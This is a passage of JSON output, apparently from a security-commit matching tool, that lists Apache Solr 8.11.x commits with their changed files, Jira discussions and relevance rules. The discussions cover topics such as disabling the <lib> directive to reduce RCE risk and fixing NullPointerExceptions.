org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)\\n\\tat org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:191)\\n\\tat org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:146)\\n\\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)\\n\\tat org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:322)\\n\\tat org.eclipse.jetty.server.handler.gzip.GzipHandler.handle(GzipHandler.java:763)\\n\\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)\\n\\tat org.eclipse.jetty.server.Server.handle(Server.java:516)\\n\\tat org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:400)\\n\\tat org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:645)\\n\\tat org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:392)\\n\\tat org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:277)\\n\\tat org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311)\\n\\tat org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:105)\\n\\tat org.eclipse.jetty.io.ChannelEndPoint$1.run(ChannelEndPoint.java:104)\\n\\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:338)\\n\\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:315)\\n\\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:173)\\n\\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)\\n\\tat org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:409)\\n\\tat org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:883)\\n\\tat org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:1034)\\n\\tat java.base/java.lang. Thread .run(Unknown Source)\\n\" , \"code\" :500}} There is probably some higher up the chain bug that tries to get the core name and its empty. However we can fix the NPE relatively simply. Hitting /solr// ends up with HttpSolrCall NPE when using Solr Cloud Commit 68ecfaf84a830aa663b2110f73d9c04e3549acb6 in solr's branch refs/heads/main from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=solr.git;h=68ecfaf84a8 ] SOLR-17034 : Hitting /solr// ends up with HttpSolrCall NPE when using Solr Cloud (#2020) Commit ff2efffd7982e64cc97e8c21bc329e0088da7721 in solr's branch refs/heads/branch_9x from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=solr.git;h=ff2efffd798 ] SOLR-17034 : Hitting /solr// ends up with HttpSolrCall NPE when using Solr Cloud (#2020) Commit f33d102f254909492b6f5d5a2142dfea791a5a4a in lucene-solr's branch refs/heads/branch_8_11 from Kevin Risden [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=f33d102f254 ] SOLR-17034 : Hitting /solr// ends up with HttpSolrCall NPE when using Solr Cloud (#2020) Closing after the 8.11.3 release"
            },
            "ghissue_refs": {
                "2020": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "RELEVANT_WORDS_IN_MESSAGE",
                    "message": "The commit message contains some relevant words: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java",
                    "relevance": 8
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-17034",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 2020",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "9118b3f3d8a2b62258e68bbf1c904fbc0ee58b61",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1699289887,
            "hunks": 5,
            "message": "SOLR-16781: <lib ../> directive disabled by default",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/core/SolrConfig.java",
                "solr/server/solr/configsets/_default/conf/solrconfig.xml",
                "solr/solr-ref-guide/src/configsets-api.adoc",
                "solr/solr-ref-guide/src/libs.adoc"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16781": "<lib> directives in solrconfig.xml used to be recommended way for including additional jar files to the classpath for a particular collection or collections. For context: This feature required complex handling of \"trusted\" vs \"non-trusted\" configsets in configset upload API to keep Solr secure (i.e. to stop RCE attacks for non-authentication enabled deployments). This security feature also broke down recently due to a bug in Schema designer ( SOLR-16777 ). Supported alternatives exist that are safer: user can add the jar files to Solr's classpath use packages to use custom jars per collection In the light of these, there's no need to continue to support the <lib> directive going forward. I propose to remove the <lib> directives handling and functionality through this issue. Remove directives from Solr If there should be a such a feature , it should be in solr.xml This is a duplicate of SOLR-6681 from 2014! Supported alternatives exist that are safer [... e.g.] use packages to use custom jars per collection Is the package manager ready to take on all of the usecases that our users previously leaned on <lib> for?  I haven't followed package-manager development too closely, but my understanding was that it still had certain limitations that would make it hard to replace <lib> e.g. support for \"standalone\" Solr deployments ( SOLR-16152 ). This feature required complex handling of \"trusted\" vs \"non-trusted\" configsets in configset upload API to keep Solr secure (i.e. to stop RCE attacks for non-authentication enabled deployments) Is the thought then that this ticket would also deprecate or remove the trusted/untrusted distinction in 10?  Or is that still relevant even if <lib> goes away? I think the trusted/untrusted construct is a key pain point. I'm not familiar enough with the other two features that seem to require it to know if we can eliminate that complexity but there might be a way to simplify <lib> handling that removes the need for trusted/untrusted in its case. Rather than getting rid of <lib> entirely, change it so that by default, it throws an error for anything outside the solr classpath. Then add a startup level configuration that adds directories to the legal locations for <lib>. This could be some combination of sysprops/environment or even something in the possible replacement for solr.in.sh contemplated by SOLR-7871 . We can debate if these locations can be recursive, and what to do (if anything) about symlinks. Thus we wind up with a two stage process: The folks who install solr define the playground The folks who interact with solr do whatever they are permitted to within that playground. Ideally in addition to throwing an error when the config set tries to load the upload process would also run this check on any files uploaded to fail fast and friendly for the user. This way would have the benefit that organizations can tune their installation to be as strict or permissive as they like. We should create good clear documentation explaining that allowing libraries to be loaded from a location to which untrusted (or less trusted) users can cause a file to be written (via solr or otherwise) makes it possible for those with config-edit to effectively install code. If they want to run with scissors, knowing the danger, let them, just don't make it the default. I'm not leaping on the solr.xml suggestion because some installs run with solr.xml in zookeeper, and configuring locations where solr can look for stuff seems like something that will be be determined by sysadmin folks at larger organizations who wouldn't want to be mucking around with solr.xml which contains a lot of esoteric search related stuff they might break. I could probably be sold on solr.xml also being a potential source, but if we have more than one location to configure this, precedence and/or merging behavior needs to be clear. PS: solr.xml loading from ZK is deprecated and gone in 10.0. But a config in solr.xml similar to solr.allowPaths makes sense. <str name= \"allowPaths\" >${solr.allowPaths:}</str> The default could be empty set, i.e. nothing allowed, and it would be up to users to define defaults. There could be a few special values: \"*\" means allow all, for quick back-compat etc. Or would it be enough to simply fail if any <lib> is outside the already defined solr.allowPaths (which defaults to $SOLR_HOME, $SOLR_DATA_HOME & coreRootDir? Added a patch for this (branch_8_11). Updated the patch, this is ready to commit. For the record: on ASF slack, janhoy and houstonputman expressed concerns regarding disabling <lib> directives by default. Hence, I'm not committing it right away, even though I think this is the right thing to do. No feature should be enabled by default that can be a security risk for RCEs etc. This holds up the 8.11.3 release, unfortunately. I wonder how we can start messaging to extension developers what they should be doing?   A Plugin Guide?  I'm thinking of all the installations of querqy that jsut use the lib dir... I'm definitely in favor of getting rid of the lib tag because there are better alternatives. \u00a0Let's do so for the next minor release like 9.5! \u00a0(flag to disable; remove altogether in main) No feature should be enabled by default that can be a security risk for RCEs etc That's a sweeping statement. \u00a0Many things can be a risk; Solr has tons of features and the vast majority of them are enabled by default, for better or worse. Take your pick... remember the XML query parser CVE? \u00a0Who would have thought. If I could block one thing by default to enhance Solr security, it'd be any sort of configuration editing, either at core level, or even ConfigSet upload. \u00a0Maybe that's not \"one thing\", it's a category, and I recognize the ConfigSet aspect isn't workable for most users (even though this is how I run Solr at work \u2013 immutable infrastructure). \u00a0Hello FileSystemConfigSetService! \u00a0Sorry; getting a bit off topic. I am for introducing solr.lib.directive.allowed property, and making it default to \"true\" in 8.x and 9.x, but with deprecation logging. Then in main (10.0) we default it to \"false\", and in 11.0 it is removed entirely. This of course requires proper communication, perhaps a blog post or two, etc. It would be a great way to educate users about modules, packages and shardedLib. I like the suggestion that janhoy provided. I'm going to remove this from \"Release Version\" 8.11.3, unless y'all are ready to merge this (with the option set to \"true\" by default). ichattopadhyaya What's the followup plan on this? Do you agree with the conservative plan proposed above Deprecate in 9.6 Enabled by default in 9.x (but with deprecation logging) Disabled by default in 10.x Removed from 11.0 We can remove in 10; no need to wait for 11. Agreed. Remove in 10. Possibly add an option to disable in 9 which is set to \"false\" by default. This option is not included in 10 obviously. Sure, there is still a few 9.x releases where users can start changing their habits. And any user upgrading to 10.0 will have a round of testing where she will have time to move libs to another location, or stay on 9.x a bit longer. Let's do it..."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/solr-ref-guide/src/configsets-api.adoc, solr/core/src/java/org/apache/solr/core/SolrConfig.java, solr/server/solr/configsets/_default/conf/solrconfig.xml, solr/solr-ref-guide/src/libs.adoc",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16781 contains some security-related terms: secure, security, rce",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: server",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16781",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "002b3ce67bea7dfe114c3b7dfdceb00b8777363c",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698631273,
            "hunks": 5,
            "message": "Revert \"SOLR-15694, 15715: Create ephemeral roles properly (missed backporting these changes last time)\" This reverts commit b54a788fe71c7f87a8b8564461cb196c138fc7ce.",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/cloud/ZkController.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-15694": "I think we should have first class support for starting a Solr node in a mode whereby no cores will be placed on them. These nodes are useful for certain scenarios: Dedicated overseer nodes Nodes where only plugins are installed and used (e.g. cluster/node level plugins) Dedicated nodes for querying (more on this to come later). Today, to achieve this effect, one can: 1. start a node (which will make it join live_nodes and be immediately available for replica placement). 2. Put replica placement rules or autoscaling policies to prevent replicas from being placed there. This is not standardized, 8x has two ways to achieve this (replica placement rules and autoscaling framework), 9x has a new autoscaling framework. Proposing a start parameter for starting a node that starts the node in this configuration, and then internally this is handled appropriately (across 8x and 9x). This should be Kubernetes/Docker friendly as well, since it is easy to add an additional parameter for a startup (instead of putting things into autoscaling.json in ZK via init scripts). Concept of node roles and non-data nodes This has been discussed many times. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. One role coud be \"zk\", which would let the node start an embedded zookeeper (for a future managed zk feature), and then you could combine it with \"data\" if the node should also be eligible for index/search. There may be other roles such as \"streaming\" perhaps which would only host streaming expression jobs, etc. This is definitely SIP worthy. janhoy , thanks. That is good feedback. This has been discussed many times. Can you please point me to that? Will link to that in future discussions. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. Today, we have a role \"overseer\" for a node. However, many users look for dedicated overseer nodes (nodes that don't handle querying or indexing), and there's no easy way today. and then you could combine it with \"data\" if the node should also be eligible for index/search. Do you recommend that we have a role \"data\" for nodes (regular nodes as we have today)? In that case, what would absence of this \"data\" role for a node mean the node doesn't host any cores? This seems reasonable for what I intend to achieve with usecases I have in mind. This is definitely SIP worthy. I'll create one, thanks janhoy We already have a file /roles.json in ZK. It has a key called \"overseer\" now. We can add a new key called \"query-nodes\" and add nodes to that Ah, did not know about that. A thousand questions pop up, such as: Should roles be supported in leader/follower mode? What would be the best way to designate roles to a node? A global file in ZK like /roles.json is one way. ENV_VARs or SysProps at each node is another. How dynamic do we need this to be, are there business needs to (re)assign roles at runtime, and in that case do we need a REST API for it? If dynamic, what role(s) would a brand new node (or k8s pod) added to the cluster be assigned? What happens if you have only assigned a role to one node and that node leaves the cluster? Should that be configurable, or would there be some cluster level plugin monitoring events, that makes such decisions? etc etc Looking forward to seeing a SIP with a thorough design and recommendation on this. Looking forward to seeing a SIP with a thorough design and recommendation on this. I'll write up the SIP today. We can address these questions there and link to this JIRA. Here's the SIP: https://cwiki.apache.org/confluence/display/SOLR/SIP-15+Node+roles Discussion is happening here: https://lists.apache.org/thread.html/rb3cbfddb6e3af9c671d037ce1e7341544a2f1ab287f184c8f53ac44c%40%3Cdev.solr.apache.org%3E Browsing the other SIPs, SIP-11 is potentially related, as ir proposes some nice cleanup of accessing cluster-level config. Not saying we should not wait for that, but I'll ping ab to explore synergies. Commit 24e5ba7105ea774de0b319337c6809d2839b9f8a in solr's branch refs/heads/jira/SOLR15694 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=24e5ba7 ] SOLR-15694 : Ref guide changes Commit e32e58c20be0540c6e89679a57aac26616911e3d in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e32e58c ] SOLR-15694 : Node roles Commit e19a13f8146a713fe883c9a17809dc542638cc85 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e19a13f ] SOLR-15694 : Node roles Can you close this and also move SIP-15 to correct section in the list? https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ichattopadhyaya why is this till open? Also the SIP (see previous comment) is listed as \"under discussion\". I'll try once moce ichattopadhyaya noble.paul Can you please move the SIP-15 to the \"Implemented\" section here https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ? Done. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Commit 2da4332072ffffb0581ef60d11de5b0d157452ac in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2da4332072f ] SOLR-15694 , 15715: Node roles and dedicated query coordinator nodes Commit b54a788fe71c7f87a8b8564461cb196c138fc7ce in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=b54a788fe71 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Commit 002b3ce67bea7dfe114c3b7dfdceb00b8777363c in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=002b3ce67be ] Revert \" SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time)\" This reverts commit b54a788fe71c7f87a8b8564461cb196c138fc7ce. Commit ace7641edb762d31519df1db845885dfd31caee4 in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=ace7641edb7 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Hi ichattopadhyaya , We are trying to use the Node roles feature to set a preferred Overseer in our Solr 9 fork. What is the purpose of having overseerDesignate in addition to specifying a preferredOverseer ? How is it specified via startup parameters? In our fork, I am configuring one node in the SolrCloud cluster with -Dsolr.node.roles=overseer:preferred,data:on . All other nodes are set to overseer:allowed,data:on by default. I have observed that during a rolling restart, the OverseerNodePrioritizer almost always elects the preferred Overseer as the Overseer, provided it is up. Additionally, since the overseerDesignate list remains empty (until the preferred Overseer is added to it), it does not affect this outcome."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "RELEVANT_WORDS_IN_MESSAGE",
                    "message": "The commit message contains some relevant words: This",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: ZooKeeper, Solr, ACLs",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/ZkController.java",
                    "relevance": 8
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-15694",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "a639d267fd395f8ed0f9b1d1e2fd4f852dc3eefd",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698551458,
            "hunks": 107,
            "message": "SOLR-16580: Avoid making copies of DocCollection for PRS updates",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/cloud/Overseer.java",
                "solr/core/src/java/org/apache/solr/cloud/RefreshCollectionMessage.java",
                "solr/core/src/java/org/apache/solr/cloud/autoscaling/sim/SnapshotClusterStateProvider.java",
                "solr/core/src/java/org/apache/solr/cloud/overseer/ClusterStateMutator.java",
                "solr/core/src/java/org/apache/solr/cloud/overseer/CollectionMutator.java",
                "solr/core/src/java/org/apache/solr/cloud/overseer/ZkStateWriter.java",
                "solr/core/src/java/org/apache/solr/handler/admin/ClusterStatus.java",
                "solr/core/src/java/org/apache/solr/handler/admin/CollectionsHandler.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/cloud/DistribStateManager.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseHttpClusterStateProvider.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ClusterState.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/DocCollection.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStates.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStatesOps.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/Replica.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/Slice.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16580": "When PRS entries are updated, a new DocCollection Object is created. We should avoid that and just do an in-place update Avoid making copies of DocCollection for PRS updates Commit e073ea5fa535d6add0d4d17ceb70c542d9f50bcc in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e073ea5fa53 ] SOLR-16580 : Avoid making copies of DocCollection for PRS updates (#1242) Commit c4f40233a718d60262ffc2610a02dfccdde7f641 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=c4f40233a71 ] SOLR-16580 : Avoid making copies of DocCollection for PRS updates (#1242) Closing after the 9.2.0 release Commit a639d267fd395f8ed0f9b1d1e2fd4f852dc3eefd in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=a639d267fd3 ] SOLR-16580 : Avoid making copies of DocCollection for PRS updates This is causing reproducible failures on branch_8_11, with PRS enabled or not enabled. ant test \u00a0-Dtestcase=CloudAuthStreamTest -Dtests.seed=F8952559841D5C83 -Dtests.multiplier=2 -Dtests.slow=true -Dtests.locale=sk -Dtests.timezone=Atlantic/Bermuda -Dtests.asserts=true -Dtests.file.encoding=UTF-8 I went through all of the commits on branch_8_11, and this is definitely the commit where the tests start failing. For some context, it looks like the issues are not with the authentication/authorization, however the delete-by-queries are not working properly. I think it might have something to do with the stateVersion of the collection, seeing as that's something that was modified by this JIRA. So if I change the shards to have 1 replica each, the errors go away. So there is something wrong with forwarding the delete by query to the leader or to the replicas. Honestly, this might be too extensive of a change for 8.11.3, since it wasn't a bug fix or a security patch. The easiest path forward could be reverting it. The reason this was added was because it was intertwined with other PRS changes. Fixing the other bugs without this is much harder So the most likely culprit here was the BaseHttpClusterStateProvider changed (IMO) but reverting that class didn't fix the errors, so we can rule it out"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/handler/admin/CollectionsHandler.java, solr/solrj/src/java/org/apache/solr/common/cloud/Slice.java, solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java, solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseHttpClusterStateProvider.java, solr/solrj/src/java/org/apache/solr/common/cloud/DocCollection.java, solr/core/src/java/org/apache/solr/cloud/Overseer.java, solr/core/src/java/org/apache/solr/handler/admin/ClusterStatus.java, solr/core/src/java/org/apache/solr/cloud/overseer/ClusterStateMutator.java, solr/core/src/java/org/apache/solr/cloud/autoscaling/sim/SnapshotClusterStateProvider.java, solr/core/src/java/org/apache/solr/cloud/RefreshCollectionMessage.java, solr/core/src/java/org/apache/solr/cloud/overseer/ZkStateWriter.java, solr/core/src/java/org/apache/solr/cloud/overseer/CollectionMutator.java, solr/solrj/src/java/org/apache/solr/client/solrj/cloud/DistribStateManager.java, solr/solrj/src/java/org/apache/solr/common/cloud/ClusterState.java, solr/solrj/src/java/org/apache/solr/common/cloud/Replica.java, solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStates.java, solr/solrj/src/java/org/apache/solr/common/cloud/PerReplicaStatesOps.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16580 contains some security-related terms: security",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler, read, provide",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16580",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "78e618444690b9ddf285e416d8045a11dceb711b",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1706289694,
            "hunks": 1,
            "message": "SOLR-17120: handle null value when merging partials (backport of solr#2214) (#2683) * SOLR-17120 handle null value when merging partials   - this change avoids a `NullPointerException` that can occur     under some circumstances when performing multiple partial     updates of the same document Co-authored-by: Calvin Smith <eukaryote@users.noreply.github.com>",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/update/UpdateLog.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-17120": "I mailed the solr-users mailing list about this issue, but didn't get any responses there, so am creating this issue. The subject of the email thread for additional context was \"NullPointerException in UpdateLog.applyOlderUpdates under solr 8&9 involving partial updates and high update load\" - link: https://lists.apache.org/thread/n9zm4gocl7cf073syy1159dy6ojjrywl I'm seeing a Solr HTTP 500 error when performing a partial update of a document that turns out to triggered by there having been a recent update of the same document that included a partial update that set a field to null . I've observed the behavior in versions 6.6.2, 8.11.2, and 9.4.0, which are the only 3 versions I've tried. To give an example, an update doc like { \"id\" : \"123\" , \"camera_unit\" : { \"set\" : null }\r\n} followed shortly thereafter (not sure of exact timing, but I was using a commitWithin of 600s and the subsequent updates were less than 20 seconds later), after some other updates had happened for different documents, there was another update of the same document, like { \"id\" : \"123\" , \"playlist\" : { \"set\" : [\r\n\u00a0 \u00a0 \u00a0 \u00a0 12345\r\n\u00a0 \u00a0 \u00a0 ]\r\n\u00a0 \u00a0 }, \"playlist_index_321\" : { \"set\" : 0\r\n\u00a0 \u00a0 }\r\n} This later update may, but doesn't always, cause the NullPointerException , so there is some other factor such as the state of the tlog that also has to be satisfied for the error to occur. The exception is thrown by the following code in UpdateLog.java ( org.apache.solr.update.UpdateLog ): /** Add all fields from olderDoc into newerDoc if not already present in newerDoc */ private void applyOlderUpdates(\r\n\u00a0 \u00a0 \u00a0 SolrDocumentBase<?, ?> newerDoc, SolrInputDocument olderDoc, Set< String > mergeFields) { for ( String fieldName : olderDoc.getFieldNames()) { // if the newerDoc has this field, then this field from olderDoc can be ignored if (!newerDoc.containsKey(fieldName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 && (mergeFields == null || mergeFields.contains(fieldName))) { for ( Object val : olderDoc.getFieldValues(fieldName)) {\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 newerDoc.addField(fieldName, val);\r\n\u00a0 \u00a0 \u00a0 \u00a0 }\r\n\u00a0 \u00a0 \u00a0 }\r\n\u00a0 \u00a0 }\r\n\u00a0 } The exception is due to the inner for statement trying to iterate over the null value being returned by olderDoc.getFieldValues(fieldName) . When I change that method to the following: /** Add all fields from olderDoc into newerDoc if not already present in newerDoc */ private void applyOlderUpdates(\r\n\u00a0 \u00a0 \u00a0 SolrDocumentBase<?, ?> newerDoc, SolrInputDocument olderDoc, Set< String > mergeFields) { for ( String fieldName : olderDoc.getFieldNames()) { // if the newerDoc has this field, then this field from olderDoc can be ignored if (!newerDoc.containsKey(fieldName)\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 && (mergeFields == null || mergeFields.contains(fieldName))) {\r\n\u00a0 \u00a0 \u00a0 \u00a0 Collection< Object > values = olderDoc.getFieldValues(fieldName); if (values == null ) {\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 newerDoc.addField(fieldName, null );\r\n\u00a0 \u00a0 \u00a0 \u00a0 } else { for ( Object val : values) {\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 newerDoc.addField(fieldName, val);\r\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 }\r\n\u00a0 \u00a0 \u00a0 \u00a0 }\r\n\u00a0 \u00a0 \u00a0 }\r\n\u00a0 \u00a0 }\r\n\u00a0 } Then after rebuilding the solr-core JAR with ./gradlew devFull and restarting Solr with that custom jar file, I can no longer reproduce the error. I'm not familiar with the Solr codebase though and am not at all sure that newerDoc.addField(fieldName, null) is what should be done there. NullPointerException in UpdateLog.applyOlderUpdates in solr 6.6-9.4 involving partial updates Thanks casmith for the detailed report on the user mailing list and for proactively proceeding to open this issue! Here's some notes from how I'm reading/interpreting the issue and the code: You mentioned the stacktrace is 8.11.2 and we see the NPE at UpdateLog.java:962 i.e. https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.11.2/solr/core/src/java/org/apache/solr/update/UpdateLog.java#L962 and if olderDoc was null then we'd have gotten a NPE at line 959 already and therefore olderDoc.getFieldValues(fieldName) must have returned null, as you mentioned. SolrInputDocument.getFieldValues will return null if the field is not set https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.11.2/solr/solrj/src/java/org/apache/solr/common/SolrInputDocument.java#L121-L127 https://solr.apache.org/guide/solr/latest/indexing-guide/partial-document-updates.html#atomic-updates documents about setting to null to remove a value. You mention use of setting to null. Here's some nearby code also calling SolrInputDocument.getFieldValues https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.11.2/solr/core/src/java/org/apache/solr/update/processor/AtomicUpdateDocumentMerger.java#L338-L339 https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.11.2/solr/core/src/java/org/apache/solr/update/processor/CloneFieldUpdateProcessorFactory.java#L430-L431 Based on the analysis above I think newerDoc.addField(fieldName, null) would be incorrect i.e. newerDoc doesn't have the field and it's not supposed to get it, hence skipping for fieldName rather than adding of null e.g. - for ( Object val : olderDoc.getFieldValues(fieldName)) {\r\n+ Collection< Object > values = olderDoc.getFieldValues(fieldName);\r\n+ if (values == null ) continue ;\r\n+ for ( Object val : values) { Having said all that ... I'm not very familiar with the partial update functionality and what puzzles me slightly is that olderDoc.getFieldNames() returned the fieldName but then olderDoc.getFieldValues() returned no corresponding value ... though maybe that's something to do with multiple partial updates to the same document in succession and corresponding update log entries etc. etc. \u2013 would love to hear insights from others on this. Thanks Christine for noting on the mailing list that I created the issue and for the very helpful summary and analysis above. My reasoning for setting the field to null was that if the olderDoc for the first partial update doc that was added was { \"id\" : \"123\" , \"camera_unit\" : { \"set\" : null }\r\n} Then the null value reflects that it should be removed from the document (so that's why the name is returned by olderDoc.getFieldNames() ). The comment on the applyOlderUpdates method suggests that the purpose is to merge all the fields from the older doc to the newer one unless they're already present, so I thought that maybe the field that should be removed should also be merged in to the newer doc too, or else the fact that the field should be removed in the document that is ultimately saved might get lost. I don't know this code at all though, so it might be that the fields set to null in the older doc don't actually need to be merged in to the newer doc, like you suggested. I'll 